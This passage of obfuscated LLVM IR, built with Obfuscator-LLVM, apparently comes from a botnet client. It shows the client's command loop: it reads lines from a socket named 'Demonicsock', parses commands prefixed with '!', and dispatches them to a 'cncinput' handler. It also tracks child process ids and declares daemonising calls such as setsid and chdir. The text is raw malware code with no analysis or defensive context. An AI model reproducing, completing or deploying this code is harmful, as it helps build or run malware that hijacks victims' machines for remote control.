  %67 = getelementptr inbounds i32, i32* %.lcssa, i64 %66
  store i32 0, i32* %67, align 4
  %68 = load i64, i64* @numpids, align 8
  %69 = add i64 %68, -1
  store i64 %69, i64* @numpids, align 8
  %70 = shl i64 %68, 2
  %71 = call noalias i8* @malloc(i64 %70) #7
  %72 = bitcast i8* %71 to i32*
  %73 = icmp eq i64 %69, 0
  %74 = load i32*, i32** @pids, align 8
  br i1 %73, label %._crit_edge82, label %.lr.ph81.preheader

.lr.ph81.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph81

.lr.ph81:                                         ; preds = %.lr.ph81.preheader, %.lr.ph81
  %75 = phi i32* [ %84, %.lr.ph81 ], [ %74, %.lr.ph81.preheader ]
  %76 = phi i64 [ %81, %.lr.ph81 ], [ 0, %.lr.ph81.preheader ]
  %.16279 = phi i32 [ %80, %.lr.ph81 ], [ 0, %.lr.ph81.preheader ]
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  %78 = load i32, i32* %77, align 4
  %79 = getelementptr inbounds i32, i32* %72, i64 %76
  store i32 %78, i32* %79, align 4
  %80 = add i32 %.16279, 1
  %81 = zext i32 %80 to i64
  %82 = load i64, i64* @numpids, align 8
  %83 = icmp ult i64 %81, %82
  %84 = load i32*, i32** @pids, align 8
  br i1 %83, label %.lr.ph81, label %._crit_edge82.loopexit

._crit_edge82.loopexit:                           ; preds = %.lr.ph81
  br label %._crit_edge82

._crit_edge82:                                    ; preds = %._crit_edge82.loopexit, %._crit_edge
  %.lcssa73 = phi i32* [ %74, %._crit_edge ], [ %84, %._crit_edge82.loopexit ]
  %85 = bitcast i32* %.lcssa73 to i8*
  call void @free(i8* %85) #7
  store i8* %71, i8** bitcast (i32** @pids to i8**), align 8
  br label %86

; <label>:86:                                     ; preds = %.lr.ph85, %._crit_edge82
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %87 = ashr exact i64 %sext, 32
  %88 = load i64, i64* @numpids, align 8
  %89 = icmp ult i64 %87, %88
  br i1 %89, label %.lr.ph85, label %._crit_edge86.loopexit

._crit_edge86.loopexit:                           ; preds = %86
  br label %._crit_edge86

._crit_edge86:                                    ; preds = %._crit_edge86.loopexit, %.preheader70
  %90 = sext i32 %41 to i64
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %90
  store i8 0, i8* %91, align 1
  call void @trim(i8* nonnull %25)
  %92 = load i8, i8* %25, align 16
  %93 = icmp eq i8 %92, 33
  br i1 %93, label %.preheader99.preheader, label %.backedge

.preheader99.preheader:                           ; preds = %._crit_edge86
  br label %.preheader99

.preheader99:                                     ; preds = %.preheader99.preheader, %95
  %.059 = phi i8* [ %96, %95 ], [ %26, %.preheader99.preheader ]
  %94 = load i8, i8* %.059, align 1
  switch i8 %94, label %95 [
    i8 0, label %.backedge.loopexit115
    i8 32, label %97
  ]

; <label>:95:                                     ; preds = %.preheader99
  %96 = getelementptr inbounds i8, i8* %.059, i64 1
  br label %.preheader99

; <label>:97:                                     ; preds = %.preheader99
  store i8 0, i8* %.059, align 1
  %98 = call i64 @strlen(i8* %26) #15
  %99 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %98
  %100 = getelementptr inbounds i8, i8* %99, i64 2
  br label %101

; <label>:101:                                    ; preds = %106, %97
  %102 = call i64 @strlen(i8* %100) #15
  %103 = add i64 %102, -1
  %104 = getelementptr inbounds i8, i8* %100, i64 %103
  %105 = load i8, i8* %104, align 1
  switch i8 %105, label %.preheader68.preheader [
    i8 13, label %106
    i8 10, label %106
  ]

.preheader68.preheader:                           ; preds = %101
  br label %.preheader68

; <label>:106:                                    ; preds = %101, %101
  store i8 0, i8* %104, align 1
  br label %101

.preheader68:                                     ; preds = %.preheader68.preheader, %108
  %.060 = phi i8* [ %109, %108 ], [ %100, %.preheader68.preheader ]
  %107 = load i8, i8* %.060, align 1
  switch i8 %107, label %108 [
    i8 32, label %110
    i8 0, label %110
  ]

; <label>:108:                                    ; preds = %.preheader68
  %109 = getelementptr inbounds i8, i8* %.060, i64 1
  br label %.preheader68

; <label>:110:                                    ; preds = %.preheader68, %.preheader68
  store i8 0, i8* %.060, align 1
  %111 = getelementptr inbounds i8, i8* %.060, i64 1
  %112 = load i8, i8* %100, align 1
  %113 = icmp eq i8 %112, 0
  br i1 %113, label %._crit_edge90, label %.lr.ph89.preheader

.lr.ph89.preheader:                               ; preds = %110
  br label %.lr.ph89

.lr.ph89:                                         ; preds = %.lr.ph89.preheader, %.lr.ph89
  %114 = phi i8 [ %119, %.lr.ph89 ], [ %112, %.lr.ph89.preheader ]
  %.05887 = phi i8* [ %118, %.lr.ph89 ], [ %100, %.lr.ph89.preheader ]
  %115 = zext i8 %114 to i32
  %116 = call i32 @toupper(i32 %115) #15
  %117 = trunc i32 %116 to i8
  store i8 %117, i8* %.05887, align 1
  %118 = getelementptr inbounds i8, i8* %.05887, i64 1
  %119 = load i8, i8* %118, align 1
  %120 = icmp eq i8 %119, 0
  br i1 %120, label %._crit_edge90.loopexit, label %.lr.ph89

._crit_edge90.loopexit:                           ; preds = %.lr.ph89
  br label %._crit_edge90

._crit_edge90:                                    ; preds = %._crit_edge90.loopexit, %110
  %121 = call i8* @strtok(i8* %111, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i64 0, i64 0)) #7
  store i8* %100, i8** %27, align 16
  %122 = icmp eq i8* %121, null
  br i1 %122, label %._crit_edge95.thread, label %.lr.ph94.preheader

.lr.ph94.preheader:                               ; preds = %._crit_edge90
  br label %.lr.ph94

._crit_edge95.thread:                             ; preds = %._crit_edge90
  call void @cncinput(i32 1, i8** nonnull %27)
  br label %.backedge

.lr.ph94:                                         ; preds = %.lr.ph94.preheader, %135
  %.05692 = phi i8* [ %136, %135 ], [ %121, %.lr.ph94.preheader ]
  %.05791 = phi i32 [ %.1, %135 ], [ 1, %.lr.ph94.preheader ]
  %123 = load i8, i8* %.05692, align 1
  %124 = icmp eq i8 %123, 10
  br i1 %124, label %135, label %125

; <label>:125:                                    ; preds = %.lr.ph94
  %126 = call i64 @strlen(i8* nonnull %.05692) #15
  %127 = add i64 %126, 1
  %128 = call noalias i8* @malloc(i64 %127) #7
  %129 = sext i32 %.05791 to i64
  %130 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %129
  store i8* %128, i8** %130, align 8
  %131 = call i64 @strlen(i8* nonnull %.05692) #15
  %132 = add i64 %131, 1
  call void @llvm.memset.p0i8.i64(i8* %128, i8 0, i64 %132, i32 1, i1 false)
  %133 = call i8* @strcpy(i8* %128, i8* nonnull %.05692) #7
  %134 = add nsw i32 %.05791, 1
  br label %135

; <label>:135:                                    ; preds = %.lr.ph94, %125
  %.1 = phi i32 [ %134, %125 ], [ %.05791, %.lr.ph94 ]
  %136 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i64 0, i64 0)) #7
  %137 = icmp eq i8* %136, null
  br i1 %137, label %._crit_edge95, label %.lr.ph94

._crit_edge95:                                    ; preds = %135
  call void @cncinput(i32 %.1, i8** nonnull %27)
  %138 = icmp sgt i32 %.1, 1
  br i1 %138, label %.lr.ph98.preheader, label %.backedge

.lr.ph98.preheader:                               ; preds = %._crit_edge95
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph98

.backedge.loopexit:                               ; preds = %.lr.ph98
  br label %.backedge

.backedge.loopexit115:                            ; preds = %.preheader99
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit115, %.backedge.loopexit, %._crit_edge95.thread, %._crit_edge95, %._crit_edge86
  %139 = load i32, i32* @Demonicsock, align 4
  %140 = call i32 @recvLine(i32 %139, i8* nonnull %25, i32 4096)
  %141 = icmp eq i32 %140, -1
  br i1 %141, label %.backedge72.loopexit, label %.preheader70

.lr.ph98:                                         ; preds = %.lr.ph98.preheader, %.lr.ph98
  %indvars.iv105 = phi i64 [ %indvars.iv.next106, %.lr.ph98 ], [ 1, %.lr.ph98.preheader ]
  %142 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %indvars.iv105
  %143 = load i8*, i8** %142, align 8
  call void @free(i8* %143) #7
  %indvars.iv.next106 = add nuw nsw i64 %indvars.iv105, 1
  %exitcond = icmp eq i64 %indvars.iv.next106, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph98
}

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #6

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readnone }
attributes #15 = { nounwind readonly }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146658232}
!2 = !{i32 -2146656792}
!3 = distinct !{!3, !4}
!4 = !{!"llvm.loop.unroll.disable"}
!5 = distinct !{!5, !4}
